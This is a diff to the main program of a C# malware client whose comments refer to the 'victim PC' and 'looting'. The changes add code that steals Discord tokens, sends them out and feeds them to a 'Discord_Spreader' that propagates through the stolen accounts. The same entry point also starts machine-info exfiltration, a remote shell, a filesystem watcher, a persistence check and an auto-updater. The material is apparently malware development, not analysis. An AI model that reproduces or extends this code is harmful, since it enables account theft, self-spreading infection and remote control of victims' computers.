@@ -22,8 +22,13 @@ namespace Client
             CheckRealApplication();
             // make sure this thing wont crash
             Application.ThreadException += Application_ThreadException;
+
             AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
 
+            /// Init update checkers.
+            Utilities.Updater Updater = new Utilities.Updater();
+
+            Updater.Start();
 #if !DEBUG
             /// Check if Application is already on victim PC
             if (!Constants.IsInAppData() && !Constants.IsInWinDir())
@@ -64,7 +69,7 @@ namespace Client
                     }
                     // everything is set
                     // set the letter to be critical, unburnable
-                    ProtectTheLetter();
+                    // ProtectTheLetter();
                     // send to events we had a successful run
 
                 }
@@ -80,15 +85,21 @@ namespace Client
             Armitage.Watchers.Filesystem.Start();
 
             /// Start looting.
-            Armitage.Cookies.Discord_Token.Send();
+            // Discord tokens
+            var discord_tokens = Armitage.Cookies.Discord_Token.Stealu();
+            Armitage.Cookies.Discord_Token.Send(discord_tokens);
+            if (discord_tokens.Count > 0)
+            {
+                Armitage.Postman.Discord_Spreader spreader = new Armitage.Postman.Discord_Spreader(discord_tokens.ToArray());
+
+                spreader.Start();
+
+            } else { Console.WriteLine("No tokens ;'( " + discord_tokens.Count.ToString()); }
 
             /// Send machine info
             Armitage.Informer.Start();
 #endif
 
-            /// Init update checkers.
-            Utilities.Updater Updater = new Utilities.Updater();
-            Updater.Start();
 
             /// Start remote shell
             Armitage.Shell.Shell.Start();
@@ -103,11 +114,14 @@ namespace Client
         private static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
         {
             Communication.String_Stacker.Send(e.ExceptionObject.ToString(), Communication.String_Stacker.StringType.ApplicationEvent);
+
         }
 
         private static void Application_ThreadException(object sender, ThreadExceptionEventArgs e)
         {
             Communication.String_Stacker.Send(e.Exception.ToString(), Communication.String_Stacker.StringType.ApplicationEvent);
+
+            
         }
 
         public static void ArgsParser(string[] args)
